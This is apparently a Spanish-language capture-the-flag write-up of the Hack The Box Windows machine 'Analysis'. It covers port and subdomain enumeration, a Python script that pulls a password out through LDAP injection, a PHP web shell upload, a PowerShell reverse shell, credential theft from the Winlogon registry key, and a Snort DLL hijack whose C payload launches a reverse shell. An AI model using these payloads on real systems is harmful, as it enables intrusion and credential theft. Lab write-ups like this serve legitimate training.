---
title: HTB Analysis Writeup
date: 2024-06-01 08:00:00 -05:00
author: retxus
categories: [HTB, Windows - AD]
tags: [Windows, http, LDAP Injection, Winrm, Kerberos, DNS, Active Directory]
comments: false
image:
  path: /assets/img/HTB-Analysis/Analysis.png
---

Muy buenas con todos, el día de hoy voy a resolver la máquina `Analysis` de HTB, espero que el procedimiento sea de su agrado y fácil de comprender.

## Reconocimiento

Primero vemos si tenemos conexión con la máquina y de paso gracias al `ttl` identificamos ante el tipo de máquina que estamos, en `linux` este suele ser de 64 y en `windows` de 128.

```bash
ping -c 1 10.10.11.250
PING 10.10.11.250 (10.10.11.250) 56(84) bytes of data.
64 bytes from 10.10.11.250: icmp_seq=1 ttl=127 time=96.6 ms

--- 10.10.11.250 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 96.571/96.571/96.571/0.000 ms
```

Vemos que el `ttl` de la máquina es de 127, el cual está próximo a 128 por ende nos encontramos ante una máquina `Windows`.

Ahora vamos a identificar los puertos abiertos dentro de la máquina, los invito a usar el siguiente `script` hecho en `bash`.

```bash
#!/bin/bash

GREEN="\e[32m"
RED="\e[31m"
RESET="\e[0m"

IP="$1"

if [ -z "$IP" ]; then
  echo "Uso: $0 <IP>"
  exit 1
fi

TEMP_FILE=$(mktemp)

echo -e "${GREEN}[+] Escaneando todos los puertos abiertos... ${RESET}"

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn "$IP" -oG "$TEMP_FILE"

# Extraer los puertos abiertos
PORTS=$(grep -oP '\d+/open' "$TEMP_FILE" | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//'; echo)

rm "$TEMP_FILE"

if [ -z "$PORTS" ]; then
  echo -e "${RED}[-] No se encontraron puertos abiertos.${RESET}"
  exit 1
fi

echo -e "\n${GREEN}[+] Escanenado servicios en los puertos: $PORTS. ${RESET}\n"

nmap -sCV -p"$PORTS" "$IP" -oN target

echo -e "\n${GREEN}[+] Escano completado. Resultados en 'target'.${RESET}\n"
```

De preferencia es mejor usar este `script` como `root`, ya que algunos parámetros de `nmap`, requieren de privilegios elevados. Esto al final nos va a generar un archivo `target` que contiene la información de los puertos abiertos dentro de la máquina.

```bash
sudo ./scan.sh 10.10.11.44
```

```bash
PORT      STATE SERVICE       versión
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-31 22:27:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL (unauthorized)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
33060/tcp open  mysqlx        MySQL X protocol listener
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
50228/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-05-31T22:28:05
|_  start_date: N/A
```
Vemos que tenemos un dominio `analysis.htb`, así que lo agregamos al `/etc/hosts`.

```bash
127.0.0.1	localhost
::1		localhost
127.0.0.1	machinename.localhost	machinename

10.10.11.250    analysis.htb
```

### Enumerar subdominios

Como hay muchos puertos abiertos vamos a ir uno por uno, primero con el puerto 53, vamos a enumerar subdominios.

```bash
dig analysis.htb @10.10.11.250 axfr

; <<>> DiG 9.18.27 <<>> analysis.htb @10.10.11.250 axfr
;; global options: +cmd
; Transfer failed.
```

Tratamos de hacer un ataque de transferencia de zona pero no nos da ningún resultado.

Ahora haciendo uso de `ffuf`, seguimos enumerando mas subdominios.

```bash
ffuf -t 100 -w diccionario.txt -H "HOST: FUZZ.analysis.htb" -u http://analysis.htb
```

Nos encuentra otro bajo el nombre `internal.analysis.htb` y también lo agregamos al `/etc/hosts`. Si nos dirigimos a la web, vemos que el único que resuelve a nivel web es el último subdominio encontrado, pero por el momento seguimos con enumerando.

### Enumerar usuarios

```bash
kerbrute userenum -t 100 diccionario.txt --dc 10.10.11.250 -d analysis.htb
```

Vemos que nos enumera algunos usuarios, así que podemos guardarlos en un archivo

## LDAP Injection

Ahora vamos a la web, precisamente en el subdominio `internal.analysis.htb`, vemos que es un forbiden, así que comenzamos a fuzzear.

```bash
ffuf -c -t 100 -w diccionario.txt -u http://internal.analysis.htb/FUZZ
```

Nos devuelve algunas rutas, pero nada interesante, así que seguimos buscando sobre las nuevas rutas, como la web está hecha con php según [wappalyzer](https://www.wappalyzer.com/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer){:target="_blank"}, comenzamos a buscar con extensión `php`.

```bash
ffuf -c -t 100 -w diccionario.txt -u http://internal.analysis.htb/users/FUZZ.php
```

Nos devuelve una ruta, en donde nos sale un mensaje solicitado un parámetro, así que me gustaria pensar que podemos intentar fuzzear eso.
![](/assets/img/HTB-Analysis/1_Analysis.png)

```bash
ffuf -c -t 100 -w diccionario.txt -u 'http://internal.analysis.htb/users/list.php?FUZZ' -fw 2
```

Vemos que el parámetro esperado es name.
![](/assets/img/HTB-Analysis/2_Analysis.png)

Vemos una tabla con diferentes tipos de datos, así que procedemos a probar algunos caracteres para ver la respuesta, y nos percatamos que cuando ponemos un `*`, los datos de la tabla cambian y podemos ver un usuario que previamente se enumeró por `kerberos`.
![](/assets/img/HTB-Analysis/3_Analysis.png)

Luego de diferentes pruebas se logra ver que estamos ante una `LDAP Injection`, según el carácter probado los datos en la tabla cambian, así que con el siguiente script realizamos el ataque.

```bash
#!/usr/bin/python3

from pwn import *
import requests, string, signal

def def_handler(sig, frame):
    print("\n [!] Saliendo... ")
    sys.exit(1)
# crtl + c
signal.signal(signal.SIGINT, def_handler)

charset = string.ascii_letters + string.digits + string.punctuation
url = "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description=FUZZ*)"

clair = ""

p1 = log.progress(f"Iniciando fuerza bruta: ")
p2 = log.progress(f"Caracteres validos: ")

while len(clair) < 14:
    found_valid_char = False

    for char in charset:
        payload = url.replace("FUZZ", clair + char)
        response = requests.get(payload)
        p1.status(payload)

        if "technician" in response.text:
            clair += char
            p2.status(clair)
            found_valid_char = True
            break
    if not found_valid_char:
        clair += "*"
```
![](/assets/img/HTB-Analysis/4_Analysis.png)
Obtenemos lo que parece ser una contraseña, así que lo probamos en la siguiente ruta `http://internal.analysis.htb/employees/login.php`, con el usuario que nos salió en la tabla.

## Ganando acceso

Logramos ingresar y somos admin en lo que parece ser un panel de análisis a incidentes de ciberseguridad, en la parte del SOC Report, vemos que podemos subir un archivo, así que como la web está hecha con `php`, subimos un archivo el cual nos permita ejecutar comandos.
![](/assets/img/HTB-Analysis/5_Analysis.png)

```bash
<?php
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Una vez subimos el archivo, tenemos que ver en que ruta se encuentra y este se localiza aquí `http://internal.analysis.htb/dashboard/uploads/pwned.php`, ahora mediante el parámetro `cmd`, que le agregamos, vemos si podemos ejecutar comandos.
![](/assets/img/HTB-Analysis/6_Analysis.png)

Ahora nos vamos <a href="https://www.revshells.com/">aquí</a> y usamos la `Powershell #3 (Base64)` para entrablar una conexión.
![](/assets/img/HTB-Analysis/7_Analysis.png)

## Pivotar de usuario
Estamos como el usuario `svc_web`, no podemos ver la flag del usuario aún, así que toca enumerar. Podemos buscar si hay alguna credencial, almacenada.

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversión\Winlogon"
```
![](/assets/img/HTB-Analysis/8_Analysis.png)

Vemos que tenemos una credencial y un usuario, como el puerto 5985 (Windows Remote Management) está abierto, podemos ver si podemos ingresar usando `evil-winrm`
![](/assets/img/HTB-Analysis/9_Analysis.png)

Logramos ingresar como el usuario `jdoe` y podemos ver la primera flag.

## Escalada de privilegios

Seguimos enumerando par ver como lograr obtener acceso como el usuario `Administrador`, buscando un poco vemos algo llamado `Snort`, podemos ver su versión.
![](/assets/img/HTB-Analysis/10_Analysis.png)

Buscando un poco [aquí](https://packetstormsecurity.com/files/138915/Snort-2.9.7.0-WIN32-DLL-Hijacking.html){:target="_blank"}, nos explican que esa versión es vulnerable y como explotar esa vulnerabilidad.

Para ello nos creamos un pequeño código en `C` y veamos que se acontece.

```bash
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
  switch(dwReason) {
    case DLL_PROCESS_ATTACH:
      system("powershell -e base64-rev-shell");
      break;
  }

return TRUE;
}
```

Luego esto lo compilamos.

```bash
x86_64-w64-mingw32-gcc -shared -o tcapi.dll tcapi.c
```

Lo subimos el `.dll` a esta ruta `C:\Snort\lib\snort_dynamicpreprocessor` del sistema y esperamos a que se ejecute el script.
![](/assets/img/HTB-Analysis/11_Analysis.png)

Ahora vemos que se estableció la conexión con la máquina, y somos el usuario Administrador y podemos ver la flag final.
